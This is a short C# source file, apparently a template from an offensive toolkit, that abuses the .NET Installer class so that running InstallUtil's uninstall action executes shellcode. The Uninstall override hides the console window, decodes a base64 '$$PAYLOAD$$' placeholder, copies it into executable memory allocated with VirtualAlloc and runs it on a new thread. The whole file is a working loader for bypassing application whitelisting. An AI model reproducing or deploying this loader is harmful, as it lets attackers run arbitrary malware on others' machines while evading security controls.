using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
*/

public class Program
{
	public static void Main()
	{
		Console.WriteLine("system");
	}
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState)
	{
		Shellcode.Exec();
	}

}

public class Shellcode
{
	public static void Exec()
	{
		IntPtr handle = GetConsoleWindow();
		ShowWindow(handle, 0);
		string strShellCode = ("$$PAYLOAD$$");
		byte[] shellcode = Convert.FromBase64String(strShellCode); 
		UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode.Length);
		IntPtr hThread = IntPtr.Zero;
		UInt32 threadId = 0;
		IntPtr pinfo = IntPtr.Zero;
		hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		WaitForSingleObject(hThread, 0xFFFFFFFF);
		return;
	}
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	[DllImport("kernel32")]
	static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

}

